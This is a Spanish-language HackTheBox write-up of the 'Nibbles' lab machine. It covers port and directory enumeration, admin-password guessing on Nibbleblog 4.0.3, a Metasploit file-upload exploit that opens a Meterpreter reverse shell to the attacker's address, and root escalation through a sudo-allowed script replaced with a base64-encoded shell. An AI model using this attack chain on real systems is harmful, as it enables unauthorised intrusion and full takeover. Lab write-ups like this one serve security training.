+++
title = "HackTheBox - Nibbles"
draft = false
description = "Resolución de la máquina Nibbles"
tags = ["HTB", "Linux", "Easy", "Nibbleblog", "CVE", "Metasploit"]
summary = "OS: Linux | Dificultad: Easy | Conceptos: Nibbleblog, CVE Público, Metasploit"
categories = ["Writeups"]
showToc = true
showRelated = true
date = "2026-02-14T00:00:00"
+++

* Dificultad: `easy`
* Tiempo aprox. `3h`
* **Datos Iniciales**: `10.129.96.84`

### Nmap Scan y enumeración

Tras realizar un escaneo nmap, se encuentran los siguientes puertos abiertos:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
#Nada en UDP
```

Vemos que la máquina ejecuta Ubuntu.

* TCP/22: **OpenSSH 7.2p2**, versión sin vulnerabilidades relevantes (solo una de username enum.).
  * Tras comprobar con `ssh -v`, vemos que los métodos de auth posibles son `publickey`,`password`.
* TCP/80: **Apache httpd 2.4.18**, versión con varias vulnerabilidades críticas.
  * `CVE-2019-0211`: Potencial elevación de privilegios, a tener en cuenta más adelante. ([En ExploitDB](https://www.exploit-db.com/exploits/46676))
  * Algunas más (de hecho, bastantes.)

## HTTP

Al entrar al puerto 80, vemos una página que dice "**`Hello world!`**". Además, dado que el servicio (en el scan nmap) no nos ha redirigido a ningún dominio o vhost, no es viable enumerar subdominios porque el muy probable que el servidor no sirva nada diferente en función del subdominio. De momento, la única alternativa es enumerar directorios y archivos en el servidor.

```bash
ffuf -u http://10.129.96.84/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.96.84/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500

                        [Status: 200, Size: 93, Words: 8, Lines: 17, Duration: 38ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 2154ms]
```

Solo encontramos un elemento, `server-status`, que no nos da ninguna información. Al mirar el código fuente de la página por defecto, encontramos lo siguiente:

```html
<html><head></head><body><b>Hello world!</b>
...[snip]...
<!-- /nibbleblog/ directory. Nothing interesting here! -->
</body></html>
```

Así que vamos al directorio `/nibbleblog/`.

## Nibbleblog

Una vez en `/nibbleblog`, encontramos lo que parece ser un blog. `whatweb` nos da la siguiente info:

```bash
$ whatweb http://10.129.96.84/nibbleblog/ 
http://10.129.96.84/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.96.84], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

La página parece estar hecha con `Nibbleblog`.

> Según [Hostsuar](https://hostsuar.com/soluciones/nibbleblog-blog),_Nibbleblog es un sistema de gestión de blogs (CMS) pensado para quienes buscan algo sencillo, rápido y fácil de instalar. No necesitas bases de datos como MySQL, ya que toda la información se guarda en archivos XML_.

Al buscar directorios aquí, si encontramos cosas:

```bash
$ gobuster dir -u http://10.129.96.84/nibbleblog -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.84/nibbleblog
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
content              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/content/]
themes               (Status: 301) [Size: 324] [--> http://10.129.96.84/nibbleblog/themes/]
admin                (Status: 301) [Size: 323] [--> http://10.129.96.84/nibbleblog/admin/]
plugins              (Status: 301) [Size: 325] [--> http://10.129.96.84/nibbleblog/plugins/]
languages            (Status: 301) [Size: 327] [--> http://10.129.96.84/nibbleblog/languages/]
```

Vamos mirando poco a poco los subdirectorios. En `/content/` vemos que tenemos permisos de lectura, por lo que podemos enumerar todo. De primeras encontramos lo siguiente:

```html
private/
public/
tmp/
```

En `tmp` no hay nada, en `public` solo hay directorios con imágenes, pero en `private`:

```html
[ ]	    categories.xml	    2017-12-10 22:52    325 	 
[ ]	    comments.xml	      2017-12-10 22:52 	  431 	 
[ ]	    config.xml	        2017-12-10 22:52 	  1.9K	 
[ ]	    keys.php	          2017-12-10 12:20 	  191 	 
[ ]	    notifications.xml	  2017-12-29 05:42 	  1.1K	 
[ ]	    pages.xml	          2017-12-28 15:59    95 	 
[DIR]   plugins/	          2017-12-10 23:27 	  - 	 
[ ]	    posts.xml	          2017-12-28 15:38 	  93 	 
[ ]	    shadow.php	        2017-12-10 12:20 	  210 	 
[ ]	    tags.xml	          2017-12-28 15:38    97 	 
[ ]	    users.xml	          2017-12-29 05:42 	  370 	 
```

* En `users` descubrimos la existencia del usuario `admin`, con ID "0".
* En `config` encontramos el email del administrador, `admin@nibbles.com`

Tras mirar todo lo demás, volvemos a enumerar, esta vez archivos:

```bash
gobuster dir -u http://10.129.96.84/nibbleblog -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.84/nibbleblog
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 2987]
sitemap.php          (Status: 200) [Size: 402]
feed.php             (Status: 200) [Size: 302]
admin.php            (Status: 200) [Size: 1401]
install.php          (Status: 200) [Size: 78]
update.php           (Status: 200) [Size: 1622]
```

De todas estas, en `update.php` encontramos que se está usando la versión `Nibbleblog 4.0.3 "Coffee"`, vulnerable a, p.ej, [CVE-2015-6967](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2015-6967) (RCE), con varios [PoC](https://github.com/hadrian3689/nibbleblog_4.0.3.git). En `admin.php` nos encontramos un panel de admin que requiere unas credenciales que desconocemos (solo tenemos el usuario `admin`).

Para aprovechar el RCE, primero necesitamos unas credenciales válidas, así que probamos varias por defecto: `admin`, `password`, `123456`... Al probar con `nibbles` conseguimos entrar.

Una vez con credenciales, iba a usar el PoC anterior, pero veo que Metasploit tiene un exploit dedicado a esto:

```bash
msf > use exploit/multi/http/nibbleblog_file_upload
...

#Al configurarlo del todo:
msf exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, s
                                         apni
   RHOSTS     10.129.96.84     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /nibbleblog/     yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.54      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3

```

Al ejecutarlo:

```bash
[*] Meterpreter session 3 opened (10.10.14.54:4445 -> 10.129.96.84:55128)

meterpreter > pwd
/var/www/html/nibbleblog/content/private/plugins/my_image
```

## Privesc

En el directorio del usuario, listamos los elementos:

```bash
meterpreter > ls
Listing: /home/nibbler
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2017-12-29 05:29:56 -0500  .bash_history
040775/rwxrwxr-x  4096  dir   2017-12-10 22:04:04 -0500  .nano
100400/r--------  1855  fil   2017-12-10 22:07:21 -0500  personal.zip
100400/r--------  33    fil   2026-02-13 18:29:14 -0500  user.txt
```

Encontramos `personal.zip`, un archivo que, al descomprimirlo, contiene `monitor.sh`, un programa que comprueba conectividad, carga del sistema, memoria, usuarios, etc.

Si usamos `sudo -l`, veremos lo siguiente:

```bash
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

Dado que somos el usuario `nibbler`, podemos crear el archivo en su directorio en `/home` con total libertad:

```bash
$ mkdir -p /home/nibbler/personal/stuff/ && cd personal/stuff
$ echo "IyEvYmluL3NoCnNoCg==" | base64 -d > monitor.sh
$ cat monitor.sh
#!/bin/sh
sh
$ chmod +x monitor.sh
$ sudo /home/nibbler/personal/stuff/monitor.sh
$ whoami
root
```

Y tenemos root.
